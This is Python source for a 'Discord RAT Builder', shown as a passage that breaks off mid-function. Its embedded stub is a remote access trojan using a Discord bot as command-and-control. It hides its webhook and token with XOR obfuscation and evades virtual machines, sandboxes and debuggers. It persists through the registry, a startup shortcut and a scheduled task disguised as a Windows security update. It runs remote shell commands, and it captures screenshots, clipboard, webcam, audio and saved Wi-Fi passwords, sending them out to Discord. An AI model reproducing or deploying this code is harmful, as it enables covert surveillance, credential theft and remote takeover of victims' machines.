"""Discord RAT Builder — Build full-featured Discord C2 RAT .exe."""

import os
import sys
import time
import subprocess

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

RAT_STUB = r'''
import os, sys, time, json, base64, subprocess, urllib.request, urllib.error, threading, platform, shutil, ctypes, struct, io, ssl, socket, hashlib, uuid, random, winreg
from datetime import datetime, timedelta
from datetime import datetime

WEBHOOK_ENC = "{webhook_enc}"
TOKEN_ENC = "{token_enc}"
GUILD_ENC = "{guild_enc}"
DEC_KEY = "{dec_key}"
DEC_KEY2 = "{dec_key2}"
DEC_KEY3 = "{dec_key3}"
PERSIST = {persist}
STEALTH = {stealth}
DEBUG = {debug}
SLEEP = {sleep}
PREFIX = "{prefix}"

def _xor(data, key):
    if isinstance(data, str): data = data.encode()
    kb = key.encode() if isinstance(key, str) else key
    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data))

def _dec(encoded, k1, k2, k3):
    raw = base64.b64decode(encoded)
    s1 = _xor(raw, k3)
    s2 = _xor(s1[::-1], k2)
    s3 = _xor(s2, k1)
    return s3.decode("utf-8", errors="replace")

WEBHOOK = _dec(WEBHOOK_ENC, DEC_KEY, DEC_KEY2, DEC_KEY3)
TOKEN = _dec(TOKEN_ENC, DEC_KEY, DEC_KEY2, DEC_KEY3)
GUILD = _dec(GUILD_ENC, DEC_KEY, DEC_KEY2, DEC_KEY3)

DEBUG_LOG = []
DBG_LOCK = threading.Lock()
PERSIST_NAMES = ["csrss", "svchost", "RuntimeBroker", "SearchIndexer", "conhost"]
KEYLOG_ACTIVE = False
KEYLOG_DATA = []
CMDS_CHANNEL = None
STATUS_CHANNEL = None
CMDS_WEBHOOK = None
PC_NAME = None

def dprint(msg):
    if DEBUG:
        ts = datetime.now().strftime('%H:%M:%S')
        line = f"[{{ts}}] {{msg}}"
        with DBG_LOCK:
            DEBUG_LOG.append(line)
        try:
            p = os.path.join(os.getenv("APPDATA", "."), "rat_debug.txt")
            with open(p, "a") as f:
                f.write(line + "\n")
        except: pass

def xor_enc(data, key="KevTool"):
    if isinstance(data, str): data = data.encode()
    key_bytes = key.encode() if isinstance(key, str) else key
    return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))

def xor_dec(data, key="KevTool"):
    return xor_enc(data, key)

def anti_vm():
    score = 0
    try:
        vm_files = [
            r"C:\Windows\System32\vmGuestService.dll", r"C:\Windows\System32\vm3dmp.sys",
            r"C:\Windows\System32\VBoxGuest.sys", r"C:\Windows\System32\VBoxMouse.sys",
            r"C:\Windows\System32\VBoxSF.sys", r"C:\Windows\System32\VBoxTray.exe",
            r"C:\Windows\System32\vboxdisp.dll", r"C:\Windows\System32\vboxhook.dll",
            r"C:\Windows\System32\vboxmnp.dll", r"C:\Windows\System32\vboxogl.dll",
            r"C:\Windows\System32\vm3dmp_loader.dll", r"C:\Windows\System32\vmhgfs.dll",
            r"C:\Windows\System32\drivers\vmci.sys", r"C:\Windows\System32\drivers\vmhgfs.sys",
            r"C:\Windows\System32\drivers\vmmouse.sys", r"C:\Windows\System32\drivers\vmrawdsk.sys",
            r"C:\Windows\System32\drivers\vmusbmouse.sys",
            r"C:\Program Files\VMware\VMware Tools", r"C:\Program Files\Oracle\VirtualBox Guest Additions",
            r"C:\Program Files\Qemu\qemu-ga", r"C:\Program Files\Parallels\Parallels Tools",
        ]
        for p in vm_files:
            if os.path.exists(p):
                score += 2
                dprint(f"VM artifact: {{p}}")
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
            mfr, _ = winreg.QueryValueEx(k, "SystemManufacturer")
            winreg.CloseKey(k)
            m = mfr.lower()
            if any(x in m for x in ["vmware", "virtualbox", "qemu", "xen", "parallels"]):
                if "microsoft corporation" not in m or "virtual" in m:
                    score += 3
                    dprint(f"VM manufacturer: {{mfr}}")
        except: pass
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
            serial, _ = winreg.QueryValueEx(k, "SystemSerialNumber")
            winreg.CloseKey(k)
            s = serial.lower()
            vm_serials = ["vmware", "virtualbox", "00000", "ru000", "xr000", "tatvm", "not available",
                          "innotek", "vbox", "parallax", "qemu", "6270670", "77847de1"]
            if any(x in s for x in vm_serials):
                score += 3
                dprint(f"VM BIOS serial: {{serial[:50]}}")
        except: pass
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
            uid, _ = winreg.QueryValueEx(k, "MachineGuid")
            winreg.CloseKey(k)
            u = uid.lower()
            if any(x in u for x in ["00000000-0000-0000-0000-000000000000", "4c4c4544", "564d4143", "77847de1"]):
                score += 2
                dprint("VM UUID pattern")
        except: pass
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\disk\Enum")
            disk, _ = winreg.QueryValueEx(k, "0")
            winreg.CloseKey(k)
            d = disk.lower()
            vm_disks = ["vbox harddisk", "vmware", "qemu harddisk", "virtual disk", "amazon ec2",
                        "nvme: amazon", "virtualbox", "xen"]
            if any(x in d for x in vm_disks):
                score += 2
                dprint(f"VM disk: {{disk[:50]}}")
        except: pass
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
            bios, _ = winreg.QueryValueEx(k, "BIOSVersion")
            winreg.CloseKey(k)
            b = bios.lower()
            if any(x in b for x in ["vbox", "virtualbox", "vmware", "qemu", "xen", "parallels", "innotek"]):
                score += 3
                dprint(f"VM BIOS version: {{bios[:50]}}")
        except: pass
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
            board, _ = winreg.QueryValueEx(k, "BaseBoardManufacturer")
            winreg.CloseKey(k)
            b = board.lower()
            if any(x in b for x in ["vmware", "virtualbox", "qemu", "xen", "parallels", "oracle"]):
                score += 2
                dprint(f"VM motherboard: {{board[:50]}}")
        except: pass
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            cpu, _ = winreg.QueryValueEx(k, "ProcessorNameString")
            winreg.CloseKey(k)
            c = cpu.lower()
            if any(x in c for x in ["qemu", "virtual cpu", "vmware virtual", "xen", "kvm"]):
                score += 2
                dprint(f"VM CPU: {{cpu[:50]}}")
        except: pass
    except: pass
    try:
        user32 = ctypes.windll.user32
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        if w <= 800 and h <= 600:
            score += 2
            dprint(f"Small resolution: {{w}}x{{h}} (sandbox?)")
    except: pass
    if score >= 6:
        dprint(f"VM detection score: {{score}} (threshold: 6)")
        return True
    return False

def anti_debug():
    score = 0
    k32 = ctypes.windll.kernel32
    try:
        if k32.IsDebuggerPresent():
            score += 5
            dprint("Debugger: IsDebuggerPresent")
    except: pass
    try:
        h = k32.GetCurrentProcess()
        is_dbg = ctypes.c_int(0)
        k32.CheckRemoteDebuggerPresent(h, ctypes.byref(is_dbg))
        if is_dbg.value:
            score += 5
            dprint("Debugger: CheckRemoteDebuggerPresent")
    except: pass
    try:
        k32.SetLastError(0)
        ctypes.windll.ntdll.NtSetInformationThread(
            k32.GetCurrentProcess(), 0x11, ctypes.byref(ctypes.c_int(0)), 4)
    except: pass
    try:
        TH32CS_SNAPPROCESS = 0x00000002
        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                        ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                        ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                        ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                        ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]
        snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        running = []
        if snap and snap != (0xFFFFFFFF if ctypes.sizeof(ctypes.c_void_p) == 4 else 0xFFFFFFFFFFFFFFFF):
            pe = PROCESSENTRY32()
            pe.dwSize = ctypes.sizeof(pe)
            if k32.Process32First(snap, ctypes.byref(pe)):
                while True:
                    running.append(pe.szExeFile.decode(errors="replace").lower())
                    if not k32.Process32Next(snap, ctypes.byref(pe)):
                        break
            k32.CloseHandle(snap)
        dbgs = ["ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "ida.exe", "idag.exe",
                "idapro.exe", "radare2.exe", "r2.exe", "gdb.exe", "lldb.exe",
                "windbg.exe", "ntsd.exe", "cdb.exe",
                "httpdebuggerpro.exe", "cheatengine.exe", "dnspy.exe",
                "de4dot.exe", "ildasm.exe", "httpanalyzer.exe"]
        for dbg in dbgs:
            if dbg in running:
                score += 3
                dprint(f"Debug tool: {{dbg}}")
        sandbox_tools = ["wireshark", "fiddler", "charles", "httpdebugger", "httpanalyzer",
                         "tcpdump", "windump", "mitmproxy", "burp", "zap",
                         "procmon", "processhacker", "autoruns", "procexp",
                         "dumpcap", "pestudio", "detect it easy"]
        for tool in sandbox_tools:
            for proc in running:
                if tool in proc:
                    score += 2
                    dprint(f"Sandbox tool: {{proc}}")
                    break
    except: pass
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor")
        cpu_count = winreg.QueryInfoKey(k)[0]
        winreg.CloseKey(k)
        if cpu_count <= 1:
            score += 1
            dprint("Single CPU (sandbox?)")
    except: pass
    try:
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
        mem = MEMORYSTATUSEX()
        mem.dwLength = ctypes.sizeof(mem)
        k32.GlobalMemoryStatusEx(ctypes.byref(mem))
        if mem.ullTotalPhys < 2 * 1024**3:
            score += 3
            dprint(f"Low RAM: {{mem.ullTotalPhys // (1024**3)}}GB (sandbox?)")
    except: pass
    try:
        free = ctypes.c_ulonglong(0)
        total = ctypes.c_ulonglong(0)
        k32.GetDiskFreeSpaceExW("C:\\\\", None, ctypes.byref(total), ctypes.byref(free))
        if total.value < 32 * 1024**3:
            score += 3
            dprint(f"Small disk: {{total.value // (1024**3)}}GB (sandbox?)")
    except: pass
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Windows")
        val, _ = winreg.QueryValueEx(k, "ShutdownTime")
        winreg.CloseKey(k)
        import struct as _st
        ft = _st.unpack("<Q", val)[0]
        boot_time = datetime(1601, 1, 1) + timedelta(microseconds=ft // 10)
        mins = (datetime.now() - boot_time).total_seconds() / 60
        if mins < 5:
            score += 2
            dprint(f"Fresh boot: {{mins:.0f}}min ago (sandbox?)")
    except: pass
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        uid, _ = winreg.QueryValueEx(k, "MachineGuid")
        winreg.CloseKey(k)
        u = uid.lower()
        if any(x in u for x in ["00000000-0000-0000-0000-000000000000", "77847de1",
                                 "00000000-0000-0000-c000-000000000000"]):
            score += 2
            dprint("Sandbox: generic UUID")
    except: pass
    try:
        user32 = ctypes.windll.user32
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        if w <= 800 and h <= 600:
            score += 2
            dprint(f"Tiny resolution: {{w}}x{{h}}")
    except: pass
    if score >= 6:
        dprint(f"Anti-debug score: {{score}} (threshold: 6)")
        return True
    return False

def get_pc_id():
    global PC_NAME
    id_file = os.path.join(os.getenv("APPDATA", "."), "rat_id.txt")
    hostname = platform.node() or "unknown"
    try:
        if os.path.isfile(id_file):
            with open(id_file, "r") as f:
                saved = f.read().strip()
            if saved:
                PC_NAME = f"{{hostname}}_{{saved[:8]}}"
                dprint(f"Loaded PC ID: {{PC_NAME}}")
                return PC_NAME
    except: pass
    uid = uuid.uuid4().hex[:8]
    try:
        with open(id_file, "w") as f:
            f.write(uid)
    except: pass
    PC_NAME = f"{{hostname}}_{{uid}}"
    dprint(f"Generated PC ID: {{PC_NAME}}")
    return PC_NAME

def discord_api(method, path, data=None, content_type=None):
    url = f"https://discord.com/api/v10{{path}}"
    headers = {{
        "Authorization": f"Bot {{TOKEN}}",
        "User-Agent": "RAT/1.0"
    }}
    body = None
    if data is not None:
        body = json.dumps(data).encode("utf-8")
        headers["Content-Type"] = "application/json"
    elif content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=15)
        raw = resp.read().decode("utf-8")
        return json.loads(raw) if raw else {{}}
    except urllib.error.HTTPError as e:
        err_body = e.read().decode("utf-8", errors="replace")[:300]
        dprint(f"API error {{e.code}}: {{err_body}}")
        return {{"error": e.code, "detail": err_body}}
    except Exception as e:
        dprint(f"API exception: {{e}}")
        return {{"error": str(e)}}

def send_webhook(text):
    data = {{"content": str(text)[:2000]}}
    body = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(WEBHOOK, data=body, headers={{"Content-Type": "application/json"}}, method="POST")
    try:
        urllib.request.urlopen(req, timeout=10)
    except: pass

def send_file(filename, file_data, channel_id=None):
    target = channel_id or CMDS_CHANNEL
    wh_url = CMDS_WEBHOOK or WEBHOOK
    if wh_url:
        boundary = base64.b16encode(os.urandom(16)).decode()
        body = b""
        body += f"--{{boundary}}\r\n".encode()
        body += f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\r\n'.encode()
        body += b"Content-Type: application/octet-stream\r\n\r\n"
        body += file_data
        body += f"\r\n--{{boundary}}--\r\n".encode()
        req = urllib.request.Request(wh_url, data=body, headers={{
            "Content-Type": f"multipart/form-data; boundary={{boundary}}"
        }}, method="POST")
        try:
            urllib.request.urlopen(req, timeout=30)
        except: pass
    elif target:
        boundary = base64.b16encode(os.urandom(16)).decode()
        payload_json = json.dumps({{"content": f"[FILE] {{filename}}"}})
        body = b""
        body += f"--{{boundary}}\r\n".encode()
        body += b"Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n"
        body += payload_json.encode("utf-8")
        body += f"\r\n--{{boundary}}\r\n".encode()
        body += f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\r\n'.encode()
        body += b"Content-Type: application/octet-stream\r\n\r\n"
        body += file_data
        body += f"\r\n--{{boundary}}--\r\n".encode()
        url = f"https://discord.com/api/v10/channels/{{target}}/messages"
        headers = {{"Authorization": f"Bot {{TOKEN}}"}}
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        req.add_header("Content-Type", f"multipart/form-data; boundary={{boundary}}")
        try:
            urllib.request.urlopen(req, timeout=30)
        except: pass

def setup_channels():
    global CMDS_CHANNEL, STATUS_CHANNEL, CMDS_WEBHOOK
    pc = get_pc_id()
    dprint(f"Setting up channels for {{pc}}")
    channels = discord_api("GET", f"/guilds/{{GUILD}}/channels")
    if "error" in channels:
        dprint(f"Failed to fetch channels: {{channels}}")
        return False
    cat_id = None
    cmds_id = None
    status_id = None
    for ch in channels:
        name = ch.get("name", "")
        if ch.get("type") == 4 and name == pc:
            cat_id = ch["id"]
        elif ch.get("type") == 0 and name == "cmds" and cat_id and ch.get("parent_id") == cat_id:
            cmds_id = ch["id"]
        elif ch.get("type") == 0 and name == "status" and cat_id and ch.get("parent_id") == cat_id:
            status_id = ch["id"]
    if not cat_id:
        dprint("Creating category...")
        result = discord_api("POST", f"/guilds/{{GUILD}}/channels", {{"name": pc, "type": 4}})
        cat_id = result.get("id")
        if not cat_id:
            dprint(f"Failed to create category: {{result}}")
            return False
        dprint(f"Category created: {{cat_id}}")
    if not cmds_id:
        dprint("Creating cmds channel...")
        result = discord_api("POST", f"/guilds/{{GUILD}}/channels", {{"name": "cmds", "type": 0, "parent_id": cat_id}})
        cmds_id = result.get("id")
        if not cmds_id:
            dprint(f"Failed to create cmds: {{result}}")
            return False
        dprint(f"cmds channel created: {{cmds_id}}")
    if not status_id:
        dprint("Creating status channel...")
        result = discord_api("POST", f"/guilds/{{GUILD}}/channels", {{"name": "status", "type": 0, "parent_id": cat_id}})
        status_id = result.get("id")
        if not status_id:
            dprint(f"Failed to create status: {{result}}")
            return False
        dprint(f"status channel created: {{status_id}}")
    CMDS_CHANNEL = str(cmds_id)
    STATUS_CHANNEL = str(status_id)
    webhooks = discord_api("GET", f"/channels/{{CMDS_CHANNEL}}/webhooks")
    wh_list = webhooks if isinstance(webhooks, list) else []
    if wh_list:
        CMDS_WEBHOOK = f"https://discord.com/api/webhooks/{{wh_list[0]['id']}}/{{wh_list[0]['token']}}"
        dprint(f"Using existing webhook")
    else:
        wh = discord_api("POST", f"/channels/{{CMDS_CHANNEL}}/webhooks", {{"name": "RAT"}})
        wh_id = wh.get("id")
        wh_token = wh.get("token")
        if wh_id and wh_token:
            CMDS_WEBHOOK = f"https://discord.com/api/webhooks/{{wh_id}}/{{wh_token}}"
            dprint(f"Created webhook: {{wh_id}}")
        else:
            dprint(f"Webhook creation failed: {{wh}}, using bot token fallback")
    dprint(f"Ready: cmds={{CMDS_CHANNEL}} status={{STATUS_CHANNEL}}")
    return True

def get_persist_name():
    custom = "{PERSIST_NAME}"
    if custom and custom != "csrss":
        return custom
    idx = hash(os.getenv("USERNAME", "")) % len(PERSIST_NAMES)
    return PERSIST_NAMES[idx]

def persist():
    if not PERSIST: return
    try:
        src = sys.argv[0]
        exe_name = get_persist_name() + ".exe"
        dst = os.path.join(os.getenv("APPDATA", "."), exe_name)
        startup = os.path.join(os.getenv("APPDATA", "."), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        startup_dst = os.path.join(startup, exe_name + ".lnk")
        task_name = "WindowsSecurityUpdate"
        if os.path.isfile(dst):
            dprint(f"Already persisted at {{dst}}")
            return
        if src != dst:
            shutil.copy2(src, dst)
            dprint(f"Copied to {{dst}}")
            try:
                subprocess.Popen([dst], creationflags=0x08000000)
                dprint("Spawned persisted copy")
            except: pass
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            ctypes.windll.advapi32.RegSetValueExW(
                ctypes.windll.advapi32.RegOpenKeyExW(
                    ctypes.windll.user32.HKEY_CURRENT_USER, key, 0, 0x20006, ctypes.byref(ctypes.c_ulong(0))
                ), "WindowsSecurity", 0, 1, dst, len(dst)*2)
            dprint("Registry persistence set (HKCU Run)")
        except Exception as e:
            dprint(f"Registry persist failed: {{e}}")
        try:
            vbs = "Set s = CreateObject(\"WScript.Shell\"):Set lnk = s.CreateShortcut(\"" + startup_dst.replace("\\", "\\\\") + "\"):lnk.TargetPath = \"" + dst.replace("\\", "\\\\") + "\":lnk.WindowStyle = 7:lnk.Description = \"Windows Security Update\":lnk.Save()"
            vbs_path = os.path.join(os.getenv("TEMP", "."), "s.vbs")
            with open(vbs_path, "w") as f:
                f.write(vbs)
            subprocess.run(["wscript", vbs_path], capture_output=True, timeout=10)
            try: os.remove(vbs_path)
            except: pass
            dprint("Startup shortcut created")
        except Exception as e:
            dprint(f"Startup shortcut failed: {{e}}")
        try:
            r = subprocess.run(["schtasks", "/create", "/tn", task_name, "/tr", dst, "/sc", "onlogon", "/rl", "highest", "/f"],
                               capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                dprint("Scheduled task created (on logon)")
            else:
                dprint(f"Task sched failed: {{r.stderr[:100]}}")
        except Exception as e:
            dprint(f"Task sched error: {{e}}")
        dprint("Persistence complete (registry + startup + scheduled task)")
    except Exception as e:
        dprint(f"Persist error: {{e}}")

def get_info():
    info = {{"user": os.getenv("USERNAME", "?"), "computer": platform.node(), "os": platform.platform(), "ip": "?", "cwd": os.getcwd(), "python": platform.python_version()}}
    try:
        info["ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
    except: pass
    try:
        k32 = ctypes.windll.kernel32
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
        mem = MEMORYSTATUSEX()
        mem.dwLength = ctypes.sizeof(mem)
        k32.GlobalMemoryStatusEx(ctypes.byref(mem))
        info["ram_free"] = f"{{mem.ullAvailPhys / (1024**3):.1f}} GB"
        info["ram_total"] = f"{{mem.ullTotalPhys / (1024**3):.1f}} GB"
    except: pass
    return info

CMDS_WEBHOOK = None

def take_screenshot():
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        SRCCOPY = 0x00CC0020
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        hdc_screen = user32.GetDC(0)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, w, h)
        gdi32.SelectObject(hdc_mem, hbitmap)
        gdi32.BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, 0, 0, SRCCOPY)
        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [("biSize", ctypes.c_ulong), ("biWidth", ctypes.c_long),
                        ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
                        ("biBitCount", ctypes.c_ushort), ("biCompression", ctypes.c_ulong),
                        ("biSizeImage", ctypes.c_ulong), ("biXPelsPerMeter", ctypes.c_long),
                        ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", ctypes.c_ulong),
                        ("biClrImportant", ctypes.c_ulong)]
        bmi = BITMAPINFOHEADER()
        bmi.biSize = ctypes.sizeof(bmi)
        bmi.biWidth = w
        bmi.biHeight = -h
        bmi.biPlanes = 1
        bmi.biBitCount = 32
        bmi.biCompression = 0
        buf = ctypes.create_string_buffer(w * h * 4)
        gdi32.GetDIBits(hdc_mem, hbitmap, 0, h, buf, ctypes.byref(bmi), 0)
        gdi32.DeleteObject(hbitmap)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(0, hdc_screen)
        bfh = struct.pack("<2sIHHI", b"BM", 54 + w * h * 4, 0, 0, 54)
        bih = struct.pack("<IiiHHIIiiII", 40, w, -h, 1, 32, 0, w * h * 4, 0, 0, 0, 0)
        tmp = os.path.join(os.getenv("TEMP", "."), "rs.bmp")
        with open(tmp, "wb") as f:
            f.write(bfh + bih + buf.raw)
        if os.path.isfile(tmp) and os.path.getsize(tmp) > 1000:
            with open(tmp, "rb") as f:
                data = f.read()
            dprint(f"Screenshot captured: {{len(data)}} bytes")
            os.remove(tmp)
            return data
    except Exception as e:
        dprint(f"Screenshot error: {{e}}")
    return None

def run_command(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, encoding='utf-8', errors='replace')
        output = r.stdout + r.stderr
        dprint(f"CMD: {{cmd[:40]}} -> {{len(output)}} chars")
        return output[:1900] if output else "(no output)"
    except subprocess.TimeoutExpired:
        return "(timeout 30s)"
    except Exception as e:
        return f"Error: {{e}}"

def get_clipboard():
    try:
        u32 = ctypes.windll.user32
        CF_UNICODETEXT = 13
        if not u32.IsClipboardFormatAvailable(CF_UNICODETEXT):
            return "(empty)"
        if not u32.OpenClipboard(0):
            return "(error)"
        h = u32.GetClipboardData(CF_UNICODETEXT)
        if not h:
            u32.CloseClipboard()
            return "(empty)"
        ptr = u32.GlobalLock(h)
        if not ptr:
            u32.CloseClipboard()
            return "(error)"
        text = ctypes.c_wchar_p(ptr).value
        u32.GlobalUnlock(h)
        u32.CloseClipboard()
        return text or "(empty)"
    except: return "(error)"

def _set_clipboard(text):
    try:
        u32 = ctypes.windll.user32
        k32 = ctypes.windll.kernel32
        CF_UNICODETEXT = 13
        if not u32.OpenClipboard(0):
            return False
        u32.EmptyClipboard()
        raw = text.encode("utf-16-le") + b"\x00\x00"
        h = k32.GlobalAlloc(0x0042, len(raw))
        ptr = k32.GlobalLock(h)
        ctypes.memmove(ptr, raw, len(raw))
        k32.GlobalUnlock(h)
        u32.SetClipboardData(CF_UNICODETEXT, h)
        u32.CloseClipboard()
        return True
    except: return False

def list_files(path):
    try:
        items = os.listdir(path)
        result = []
        for item in items:
            full = os.path.join(path, item)
            if os.path.isdir(full):
                result.append(f"  [DIR]  {{item}}/")
            else:
                size = os.path.getsize(full)
                if size > 1048576:
                    result.append(f"  [FILE] {{item}} ({{size/1048576:.1f}} MB)")
                elif size > 1024:
                    result.append(f"  [FILE] {{item}} ({{size/1024:.1f}} KB)")
                else:
                    result.append(f"  [FILE] {{item}} ({{size}} B)")
        return "\n".join(result[:50]) if result else "(empty directory)"
    except Exception as e:
        return f"Error: {{e}}"

def get_wifi():
    try:
        r = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, timeout=10)
        lines = r.stdout.split('\n')
        profiles = []
        for line in lines:
            if "All User Profile" in line:
                name = line.split(":")[-1].strip()
                if name:
                    r2 = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                         capture_output=True, text=True, timeout=10)
                    pwd = ""
                    auth = ""
                    for l2 in r2.stdout.split('\n'):
                        if "Key Content" in l2:
                            pwd = l2.split(":")[-1].strip()
                        if "Authentication" in l2:
                            auth = l2.split(":")[-1].strip()
                    entry = f"  {{name}}"
                    if auth: entry += f" ({{auth}})"
                    entry += f": {{pwd or '(no key)'}}"
                    profiles.append(entry)
        return "\n".join(profiles[:20]) if profiles else "(no wifi profiles)"
    except Exception as e:
        return f"Error: {{e}}"

def webcam_capture():
    try:
        tmp = os.path.join(os.getenv("TEMP", "."), "webcam.bmp")
        user32 = ctypes.windll.user32
        avicap = ctypes.windll.avicap32
        WM_CAP_START = 0x400
        WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10
        WM_CAP_SET_PREVIEWRATE = WM_CAP_START + 52
        WM_CAP_SET_PREVIEW = WM_CAP_START + 50
        WM_CAP_SAVEDIB = WM_CAP_START + 25
        WM_CAP_STOP = WM_CAP_START + 68
        capCreate = avicap.capCreateCaptureWindowW
        capCreate.argtypes = [ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_int, ctypes.c_int,
                              ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
        capCreate.restype = ctypes.c_void_p
        hwnd = capCreate("cap", 0x50000000, 0, 0, 640, 480, None, 0)
        if not hwnd:
            return None
        user32.SendMessageW(hwnd, WM_CAP_DRIVER_CONNECT, 0, 0)
        time.sleep(1)
        user32.SendMessageW(hwnd, WM_CAP_SET_PREVIEWRATE, 33, 0)
        user32.SendMessageW(hwnd, WM_CAP_SET_PREVIEW, 1, 0)
        time.sleep(2)
        tmp_buf = ctypes.c_wchar_p(tmp)
        user32.SendMessageW(hwnd, WM_CAP_SAVEDIB, 0, ctypes.addressof(tmp_buf))
        time.sleep(1)
        user32.SendMessageW(hwnd, WM_CAP_STOP, 0, 0)
        user32.SendMessageW(hwnd, 0x0010, 0, 0)
        if os.path.isfile(tmp) and os.path.getsize(tmp) > 1000:
            with open(tmp, "rb") as f:
                data = f.read()
            os.remove(tmp)
            return data
    except Exception as e:
        dprint(f"Webcam error: {{e}}")
    return None

def audio_record(duration=5):
    try:
        tmp = os.path.join(os.getenv("TEMP", "."), "audio.wav")
        winmm = ctypes.windll.winmm
        class WAVEFORMATEX(ctypes.Structure):
            _fields_ = [("wFormatTag", ctypes.c_ushort), ("nChannels", ctypes.c_ushort),
                        ("nSamplesPerSec", ctypes.c_ulong), ("nAvgBytesPerSec", ctypes.c_ulong),
                        ("nBlockAlign", ctypes.c_ushort), ("wBitsPerSample", ctypes.c_ushort),
                        ("cbSize", ctypes.c_ushort)]
        class WAVEHDR(ctypes.Structure):
            _fields_ = [("lpData", ctypes.c_void_p), ("dwBufferLength", ctypes.c_ulong),
                        ("dwBytesRecorded", ctypes.c_ulong), ("dwUser", ctypes.c_void_p),
                        ("dwFlags", ctypes.c_ulong), ("dwLoops", ctypes.c_ulong),
                        ("lpNext", ctypes.c_void_p), ("reserved", ctypes.c_ulong)]
        fmt = WAVEFORMATEX()
        fmt.wFormatTag = 1
        fmt.nChannels = 1
        fmt.nSamplesPerSec = 22050
        fmt.nAvgBytesPerSec = 44100
        fmt.nBlockAlign = 2
        fmt.wBitsPerSample = 16
        fmt.cbSize = 0
        hwi = ctypes.c_void_p()
        r = winmm.waveInOpen(ctypes.byref(hwi), 1, ctypes.byref(fmt), 0, 0, 0)
        if r != 0:
            return None
        buf_size = 22050 * duration * 2
        buf = ctypes.create_string_buffer(buf_size)
        hdr = WAVEHDR()
